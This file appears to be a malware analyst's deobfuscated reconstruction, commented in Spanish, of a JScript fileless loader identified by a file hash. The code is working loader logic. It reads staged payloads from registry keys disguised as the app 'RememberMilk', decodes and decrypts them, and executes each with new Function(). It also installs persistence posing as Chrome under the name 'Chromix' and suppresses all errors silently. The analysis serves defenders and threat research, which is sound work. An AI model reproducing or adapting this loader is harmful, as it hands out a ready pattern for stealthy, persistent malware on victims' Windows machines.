/**
 * ============================================================================
 *  SPY LOADER (JScript / WSH) — VERSION DESOFUSCADA Y RENOMBRADA
 * ============================================================================
 *  Original : d3b6c64efadcc722d1feabb677f0e11001901e97f0be35c8fe12731a6dc0ab70
 *  Tipo     : Loader fileless basado en registro (JScript para Windows Script Host)
 *
 *  COMPORTAMIENTO:
 *    Lee codigo JavaScript malicioso almacenado en el REGISTRO de Windows, bajo
 *    claves disfrazadas de la aplicacion legitima "RememberMilk", lo decodifica
 *    y lo ejecuta con new Function(). Tambien instala persistencia bajo el
 *    nombre "Chromix" (disfrazado de Google Chrome).
 *
 *    El codigo real NO esta en este archivo: se carga por etapas desde:
 *      HKCU\Software\RememberMilk\Input\XAZGMSWAEG                (etapa 3, cifrada)
 *      HKCU\Software\RememberMilk\Accept\Resource\Service\Size\... (etapas 1 y 2)
 *      HKCU\Software\RememberMilk\Accept\Resource\Volume\Update\... (clave de etapa 3)
 *
 *  OFUSCACION ORIGINAL:
 *    - Nombres de variables aleatorios (QGXYRURO, KHCAISXY, ...).
 *    - Comentarios senuelo entre instrucciones (/* RHMVQRXBDWK * /).
 *    - Las funciones de decodificacion (AMWUHBSP, BUJOZNJR, LOGNORCO) se cargan
 *      desde el registro en la etapa 1 (no estan en este archivo).
 * ============================================================================
 */

try {
    var shell = new ActiveXObject('WScript.Shell');

    // Lee un valor del registro. Si la lectura directa falla, concatena los
    // valores fragmentados con sufijos _0, _1, _2, ... hasta agotarlos.
    function readRegistryMulti(shell, path) {
        try {
            return shell.RegRead(path);
        } catch (e) { /* no hay valor simple */ }

        var result = '';
        var i = 0;
        try {
            while (true) {
                result += shell.RegRead(path + '_' + i);
                i++;
            }
        } catch (e) { /* fin de los fragmentos */ }

        return result;
    }

    var regRoot = 'HKCU\\Software';

    // Claves de registro disfrazadas de la aplicacion "RememberMilk"
    var regKeys = [
        regRoot + '\\RememberMilk\\Input',
        regRoot + '\\RememberMilk\\Accept\\Resource\\Service\\Size',
        regRoot + '\\RememberMilk\\Accept\\Resource\\Volume\\Update',
        regRoot + '\\RememberMilk\\Insecure\\Save'
    ];

    // Etapa 1: codigo JS en claro desde el registro. Define las funciones
    // auxiliares AMWUHBSP (base64), BUJOZNJR (persistencia) y LOGNORCO (descifrado).
    var stage1 = readRegistryMulti(shell, regKeys[1] + '\\MBBIMFFZSO');
    if (stage1) {
        (new Function(stage1))();
    }

    // Etapa 2: codigo JS codificado en base64 desde el registro.
    var stage2 = decodeBase64(readRegistryMulti(shell, regKeys[1] + '\\OJIYMVWHHT'));
    if (stage2 && stage2.length > 0) {
        (new Function(stage2))();
    }

    // Persistencia: se reinstala bajo el nombre "Chromix" (disfraz de Chrome).
    installPersistence(shell, 'Chromix', WScript.ScriptFullName);

    // Etapa 3: codigo JS cifrado + clave en base64, descifrado y ejecutado.
    var stage3 = decrypt(
        readRegistryMulti(shell, regKeys[0] + '\\XAZGMSWAEG'),
        decodeBase64(readRegistryMulti(shell, regKeys[2] + '\\EGBKFZSNVS'))
    );
    if (stage3 && stage3.length > 0) {
        (new Function(stage3))();
    }
} catch (e) {
    // silencioso
}
